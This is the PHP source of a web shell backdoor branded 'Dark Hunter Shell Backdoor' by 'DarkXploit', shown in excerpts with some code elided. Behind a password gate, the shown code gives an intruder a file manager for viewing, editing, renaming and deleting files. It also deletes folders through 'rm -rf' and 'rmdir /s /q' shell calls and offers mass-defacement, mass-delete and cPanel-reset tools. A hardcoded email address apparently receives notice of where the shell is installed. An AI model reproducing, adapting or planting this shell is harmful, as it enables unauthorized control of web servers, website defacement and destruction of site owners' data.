<?php
/*Made By DarkXploit
Nothing is perfect all system are weak
*/
...
$password 			= "4644e0287474cfd981fe7cd7383ccb16";   // Dark Hunter
$color 				= "#00ff00";
...
<html lang="en">
  <head>
    ...
    <meta charset="utf-8">
		...
		<link rel='icon' type='image/png' href='https://i.ibb.co/yf6TMzZ/20210118-031502.png/>
		<meta name='author' content='Dark Hunter 141'/>
		<meta name='author' content='DarkXploit'/>
		<meta name='copyright' content='DarkXploit'/>
		<meta name='description' content='Dark Hunter Shell Backdoor'>
...
<link href='http://fonts.googleapis.com/css?family=Jolly+Lodger' rel='stylesheet' type='text/css'>
    <title>Dark Hunter Shell Backdoor</title>
    <style>
    	body{
    		background: url("https://pa1.narvii.com/6958/b32afa2ea9c603fc4f73fc443ec0504d42d63d82r1-300-300_hq.gif");
    		}
    	img{
    		width: 450px;
    		height: 250px;
  ...
  <body class="text-white">
    <div class="p-3">
   <center> <font face="Jolly Lodger" color="red" size="1000"> &#9760; Dark<font face="Jolly Lodger" color="silver" size="1000">Hunter&#9760;</font>
   </br>
   </br>
    	<img src="https://g.top4top.io/p_1894pa7e80.png" width="0" height="0">
    		<form method="post">
    		  </br>
   </br>
    	<div class="row">
    	...
    	<hr>
    	<center>
    		<small>Copyright &copy; <a href="https://www.google.com">Made By DarkXploit</a></small>
    	</center>
    </div>
...
echo "
<html>
	<title>Dark Hunter Shell </title>
	<head>
		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
		<link rel='icon' type='image/png' href=https://g.top4top.io/p_1894pa7e80.png'/>
		<meta name='author' content='DarkXploit'/>
		<meta name='copyright' content='Dark Hunter'/>
		<meta name='description' content='Dark Hun SHELL BACKDOOR'>
                <meta name='theme-color' content='#000'>
	...
	<body class='text-light'>
		...
		body{background-color:black;}
			...
			.about .card-body .img{
				position: relative;
				background: url(https://g.top4top.io/p_1894pa7e80.png);
...
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
		...
		<div class=''>
			<h1 class='text-center'><a href='https://google.com/?m=1'>&#9760; Dark Hunter 141 &#9760;</h1>
			<center><p>Nothing is perfect,All system are weak</a></p></center>
			<hr/>";
		//keluar
	...
	<div class="alert alert-info mt-3">
		...
		*/
		if($_GET['aksi'] == 'view') {
			echo '<center>[ <a href="?dir='.$path.'&aksi=view&dirf='.$file.'">See</a> ]  
			[ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Edit</a> ]  
			[ <a href="?dir='.$path.'&aksi=deletef&dirf='.$file.'">Delete</a> ]</center>';
			echo "
		...
		*/
		if($_GET['aksi'] == 'edit') {
			$nama = basename($file);
			echo '<center>[ <a href="?dir='.$path.'&aksi=view&dirf='.$file.'">See</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&dirf='.$file.'">Update Nama</a> ]  
			[ <a href="?dir='.$path.'&aksi=deletef&dirf='.$file.'">Delete</a> ]</center><hr>';
			...
			if(isset($_POST['edit_file'])) {
				...
				if ($hasil) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Berhasil MengUpdate Isi File");</script>';
				}else{
					echo '<script>alert("Gagal MengUpdate Isi File");</script>';
				}
			}
		}
		...
		*/
		if($_GET['aksi'] == 'rename') {
			$nama = basename($file);
			echo '<center>[ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Back</a> ]</center>';
			echo "<form method='post' class='mt-3'>
				<p class='ml-2'><i class='fa fa-file'></i> $nama</p>
		...
		/*
			Delete File
		*/
		if ($_GET['aksi'] == 'deletef') {
			$nama = basename($file);
			echo '<center>
			[ <a href="?dir='.$path.'&aksi=view&dirf='.$file.'">See</a> ]  
			[ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Edit</a> ]  
			[ <a href="?dir='.$dir.'&aksi=rename&dirf='.$file.'">Update Nama</a> ]</center>';
			$output ="
			<div class=''>
				<center><br/>
					<font color='white'>Yakin Ingin Mengdelete File : $nama
				</center><br/><br/>
				<form method='post'>
				<div class='row'>
				<div class='col'>
			...
			if ($_POST['ya']) {
				$delete = unlink($file);
				if ($delete) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Berhasil Mengdelete File");</script>';
				}else{
					echo '<script>alert("Gagal Mengdelete File!");</script>';
				}
			}
		}
		...
		*/
		...
		/*
			Delete Folder
		*/
		if ($_GET['aksi'] == 'delete_folder' ) {
			$nama = basename(getcwd());
			$output ="
			<center>[ <a href='?dir=".$dir."&aksi=rename_folder'>Update Nama</a> ]  [ <a href='?dir=".$dir."&aksi=delete_folder'>Delete</a> ]</center> 
			<div class='container'>
				<center><br/>
					<font color='white'>Yakin Ingin Mengdelete Folder : $nama ?
				</center><br/><br/>
				<form method='post'>
				<div class='row'>
				<div class='col'>
			...
			if ($_POST['ya']) {
				if(is_dir($dir)) {
					if(is_writable($dir)) {
						...
						@exe("rm -rf $dir");
						@exe("rmdir /s /q $dir");
						echo "<script>window.location='?dir=".dirname($dir)."'; alert('Berhasil Mengdelete Folder');</script>";
					} else {
						echo "<script>window.location='?dir=".dirname($dir)."'; alert('Tidak Dapat Mengdelete Folder');</script>";
					}
				}
			}
		exit;
		...
		*/
		if ($_GET['aksi'] == 'rename_folder' ) {
			...
			$output="
			<center> 
			[ <a href='?dir=".$dir."&aksi=delete_folder'>Delete</a> ]<hr></center><p class='ml-2'>Nama Folder => $nama</p>
			<form method='post'>
				<input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...'><br/>
		...
		*/
		if($_GET['aksi'] == 'MassDellete') {
			...
			if($_POST['start']) {
				...
				echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Back</a>";
			} else {
	...
	if($_GET['aksi'] == 'MassDeface') {
		...
		echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Back</a>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' placeholder='Hacked By An0n K4ndar'></textarea><br/>
	...
	*/
	...
	if ($_GET['aksi'] == 'CpanelReset') {
		...
		<form method="POST">
			<div class="form-group">
				<input type="email" name="email" class="form-control" placeholder="Sending Email..."/><br/>
		...
		echo '<div class="table-responsive-lg">
			...
			echo 
				'<tr>
					...
					<td><center>
						<a title="Update Nama" class="badge" href="?dir='.$path.'/'.$dir.'&aksi=rename_folder">&nbsp;Update Nama</a>&nbsp;&nbsp;
						<a title="Delete" class="badge" href="?dir='.$path.'/'.$dir.'&aksi=delete_folder">&nbsp;delete</a>
					</td>
				';
		}
...
if($ext == "php") {
					...
					<td class="text-center">
						<a title="See" class="badge" href="?dir='.$path.'&aksi=view&dirf='.$path.'/'.$file.'">See</a>
						<a title="Edit" class="badge" href="?dir='.$path.'&aksi=edit&dirf='.$path.'/'.$file.'">Edit</a>
						<a title="Edit" class="badge" href="?dir='.$path.'&aksi=rename&dirf='.$path.'/'.$file.'">Update Nama</a>
						<a class="badge" href="?dir='.$path.'&aksi=deletef&dirf='.$path.'/'.$file.'" title="Delete">delete</a>
					</td>
				</tr>';
			}
		echo '</table></div><hr/>';
		echo "<a href='' class='scrollToTop'><i class='fas fa-arrow-up up'></i></a>";
		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="https: google.com">DarkXploit</a></small></center>';
?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
...
$tujuanmail = 'fuck@gmail.com, fuck.com';
